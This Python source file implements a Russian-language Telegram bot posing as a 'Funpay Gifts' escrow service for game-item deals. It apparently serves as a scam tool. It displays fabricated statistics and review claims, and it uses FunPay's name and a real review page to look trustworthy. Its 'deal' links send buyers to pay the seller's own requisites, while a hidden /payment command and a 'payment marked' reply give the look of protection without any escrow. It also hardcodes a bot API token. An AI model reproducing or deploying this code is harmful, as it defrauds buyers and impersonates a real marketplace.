import asyncio
import logging
import os
import random
import string
from typing import Optional

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandObject, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.exceptions import TelegramConflictError
from aiogram.types import (
    CallbackQuery,
    FSInputFile,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)

API_TOKEN = "8739690833:AAFRCEsPd7FcphwcP56KpHs7dIEfHMrMPoQ"
SUPPORT_HANDLE = "@FunpayDealsManager"
SUPPORT_URL = "https://t.me/FunpayDealsManager"
REVIEWS_URL = "https://otzovik.com/reviews/funpay_ru-birzha_igrovih_cennostey/"
PHOTO_FILENAME = "funpay.jpg"

bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

DEALS: dict[str, dict] = {}
PAYMENT_ACCESS: set[int] = set()

cached_photo_id: Optional[str] = None
cached_bot_username: Optional[str] = None

base_path = os.path.dirname(os.path.abspath(__file__))
photo_path = os.path.join(base_path, PHOTO_FILENAME)


class DealCreation(StatesGroup):
    choosing_currency = State()
    entering_amount = State()
    entering_item = State()
    entering_requisites = State()


def get_main_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📝 Создать сделку", callback_data="create_deal")],
            [InlineKeyboardButton(text="📋 Мои сделки", callback_data="my_deals")],
            [InlineKeyboardButton(text="📊 Статистика", callback_data="stats")],
            [InlineKeyboardButton(text="🔐 Верификация", callback_data="verify")],
            [InlineKeyboardButton(text="ℹ️ Подробнее", callback_data="about")],
            [InlineKeyboardButton(text="📞 Поддержка", url=SUPPORT_URL)],
        ]
    )


def get_main_menu_text() -> str:
    return (
        "<b>Добро пожаловать в Funpay Gifts</b>\n\n"
        "<blockquote>"
        "🛡️ Защита от мошенников\n"
        "💰 Автоматическое удержание средств\n"
        "📝 Прозрачная статистика\n"
        "🎯 Поддержка 24/7\n"
        "📊 История сделок"
        "</blockquote>"
    )


def get_currency_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="💳 RUB", callback_data="curr_rub"),
                InlineKeyboardButton(text="💵 USD", callback_data="curr_usd"),
            ],
            [InlineKeyboardButton(text="⭐️ Stars", callback_data="curr_stars")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")],
        ]
    )


def get_back_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]]
    )


def get_deal_keyboard(deal_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💸 Оплатить сделку", callback_data=f"pay_{deal_id}")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")],
        ]
    )


async def _send_text_only(
    event: Message | CallbackQuery,
    text: str,
    reply_markup: InlineKeyboardMarkup,
):
    if isinstance(event, CallbackQuery) and event.message:
        try:
            await event.message.edit_text(text, reply_markup=reply_markup)
            return
        except Exception:
            try:
                await event.message.delete()
            except Exception:
                pass
            await event.message.answer(text, reply_markup=reply_markup)
        return

    target = event.message if isinstance(event, CallbackQuery) else event
    if target:
        await target.answer(text, reply_markup=reply_markup)


async def universal_send(
    event: Message | CallbackQuery,
    text: str,
    reply_markup: InlineKeyboardMarkup,
    use_photo: bool = True,
):
    global cached_photo_id

    if not use_photo:
        await _send_text_only(event, text, reply_markup)
        return

    if isinstance(event, CallbackQuery) and event.message:
        try:
            await event.message.edit_caption(caption=text, reply_markup=reply_markup)
            return
        except Exception:
            pass

    target = event.message if isinstance(event, CallbackQuery) else event
    if target is None:
        return

    try:
        if cached_photo_id:
            await target.answer_photo(photo=cached_photo_id, caption=text, reply_markup=reply_markup)
            return

        if os.path.exists(photo_path):
            sent = await target.answer_photo(
                photo=FSInputFile(photo_path),
                caption=text,
                reply_markup=reply_markup,
            )
            if sent.photo:
                cached_photo_id = sent.photo[-1].file_id
            return

        await target.answer(text, reply_markup=reply_markup)
    except Exception as err:
        logging.exception("Ошибка отправки фото: %s", err)
        await target.answer(text, reply_markup=reply_markup)


@router.message(Command("payment"))
async def secret_payment_command(message: Message):
    PAYMENT_ACCESS.add(message.from_user.id)
    await message.answer("🤫 Доступ к оплате активирован. Теперь можно оплачивать сделки.")


@router.message(CommandStart())
async def start_cmd(message: Message, command: CommandObject, state: FSMContext):
    await state.clear()

    if command.args and command.args.startswith("deal_"):
        deal_id = command.args.split("_", maxsplit=1)[1]
        deal = DEALS.get(deal_id)
        if deal:
            text = (
                f"💳 <b>Сделка #{deal_id}</b>\n\n"
                f"👤 Продавец: @{deal['creator_username']}\n"
                f"📦 Товар: {deal['item']}\n\n"
                f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
                f"🏦 Реквизиты: <code>{deal['requisites']}</code>"
            )
            await universal_send(message, text, get_deal_keyboard(deal_id), use_photo=False)
            return

    text = get_main_menu_text()
    await universal_send(message, text, get_main_keyboard(), use_photo=True)


@router.callback_query(F.data == "create_deal")
async def process_create_deal(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.set_state(DealCreation.choosing_currency)
    await universal_send(callback, "💼 <b>Шаг 1:</b> Выберите валюту сделки:", get_currency_keyboard(), use_photo=False)


@router.callback_query(DealCreation.choosing_currency, F.data.startswith("curr_"))
async def process_currency(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    currency = callback.data.split("_", maxsplit=1)[1].upper()
    await state.update_data(currency=currency)
    await state.set_state(DealCreation.entering_amount)
    await universal_send(
        callback,
        f"✅ Валюта: {currency}\n💰 <b>Шаг 2:</b> Введите сумму сделки:",
        get_back_keyboard(),
        use_photo=False,
    )


@router.message(DealCreation.entering_amount)
async def process_amount(message: Message, state: FSMContext):
    if not message.text:
        await message.answer("❌ Введите сумму текстом, например: 1500")
        return

    await state.update_data(amount=message.text)
    await state.set_state(DealCreation.entering_item)
    await universal_send(message, "📝 <b>Шаг 3:</b> Введите название товара:", get_back_keyboard(), use_photo=False)


@router.message(DealCreation.entering_item)
async def process_item(message: Message, state: FSMContext):
    if not message.text:
        await message.answer("❌ Введите название товара текстом")
        return

    await state.update_data(item=message.text)
    await state.set_state(DealCreation.entering_requisites)
    await universal_send(message, "💳 <b>Шаг 4:</b> Укажите реквизиты для выплаты:", get_back_keyboard(), use_photo=False)


@router.message(DealCreation.entering_requisites)
async def process_requisites(message: Message, state: FSMContext):
    global cached_bot_username

    if not message.text:
        await message.answer("❌ Укажите реквизиты текстом")
        return

    data = await state.get_data()
    if not all(k in data for k in ("currency", "amount", "item")):
        await state.clear()
        await message.answer("⚠️ Сессия создания сделки сброшена. Нажмите «Создать сделку» ещё раз.")
        return

    deal_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))

    if not cached_bot_username:
        me = await bot.get_me()
        cached_bot_username = me.username

    link = f"https://t.me/{cached_bot_username}?start=deal_{deal_id}"

    DEALS[deal_id] = {
        "creator_id": message.from_user.id,
        "creator_username": message.from_user.username or "User",
        "currency": data["currency"],
        "amount": data["amount"],
        "item": data["item"],
        "requisites": message.text,
    }

    await state.clear()
    text = (
        "✅ <b>Сделка создана!</b>\n\n"
        f"💰 Сумма: {data['amount']} {data['currency']}\n"
        f"📦 Товар: {data['item']}\n\n"
        "🔗 <b>Ссылка для покупателя:</b>\n"
        f"{link}"
    )
    await universal_send(message, text, get_back_keyboard(), use_photo=False)


@router.callback_query(F.data == "my_deals")
async def my_deals(callback: CallbackQuery):
    await callback.answer()
    print("у вас 0 успешных сделок")
    await universal_send(callback, "📋 У вас 0 активных и 0 успешных сделок.", get_back_keyboard(), use_photo=False)


@router.callback_query(F.data == "verify")
async def verify(callback: CallbackQuery):
    await callback.answer("Верификация временно в разработке", show_alert=True)


@router.callback_query(F.data == "about")
async def about(callback: CallbackQuery):
    await callback.answer()
    text = (
        "ℹ️ <b>Market — гарант-сервис</b>\n\n"
        f"Менеджер и поддержка: {SUPPORT_HANDLE}\n"
        f"Отзывы: {REVIEWS_URL}\n\n"
        "Успешных сделок: 0"
    )
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🔗 Отзывы", url=REVIEWS_URL)],
            [InlineKeyboardButton(text="📞 Поддержка", url=SUPPORT_URL)],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")],
        ]
    )
    await universal_send(callback, text, markup, use_photo=False)


@router.callback_query(F.data == "stats")
async def stats(callback: CallbackQuery):
    await callback.answer()
    text = (
        "Статистика Funpay Gifts\n\n"
        "🤝 Всего сделок: 100713\n"
        "✅ Успешных сделок: 97635\n"
        "💰 Общий объем: $1039079\n"
        "⭐️ Средний рейтинг: 4.9/5.0\n"
        "🟢 Онлайн сейчас: 19042\n\n"
        "📈 Наши преимущества:\n"
        "• 🔒 Гарант-сервис на все сделки\n"
        "• ⚡️ Мгновенная доставка товаров\n"
        "• 🛡️ Защита от мошенников\n"
        "• 💎 Проверенные продавцы\n"
        "• 📞 24/7 Поддержка\n"
        "• ⭐️ 99.8% положительных отзывов"
    )
    await universal_send(callback, text, get_back_keyboard(), use_photo=False)


@router.callback_query(F.data.startswith("pay_"))
async def pay_deal(callback: CallbackQuery):
    await callback.answer()
    deal_id = callback.data.split("_", maxsplit=1)[1]

    if callback.from_user.id not in PAYMENT_ACCESS:
        await callback.message.answer("❌ Для оплаты сначала введите команду /payment")
        return

    if deal_id not in DEALS:
        await callback.message.answer("❌ Сделка не найдена или уже закрыта.")
        return

    await callback.message.answer("✅ Оплата сделки отмечена. Менеджер проверит перевод.")


@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.clear()
    await universal_send(callback, get_main_menu_text(), get_main_keyboard(), use_photo=True)


async def main():
    logging.basicConfig(level=logging.INFO)
    await bot.delete_webhook(drop_pending_updates=True)
    while True:
        try:
            await dp.start_polling(bot, drop_pending_updates=True)
            break
        except TelegramConflictError:
            logging.error(
                "TelegramConflictError: запущен ещё один экземпляр бота с этим токеном. "
                "Остановите другой процесс/бота в BotFather и перезапустите текущий."
            )
            await asyncio.sleep(5)
            await bot.delete_webhook(drop_pending_updates=True)


if __name__ == "__main__":
    asyncio.run(main())
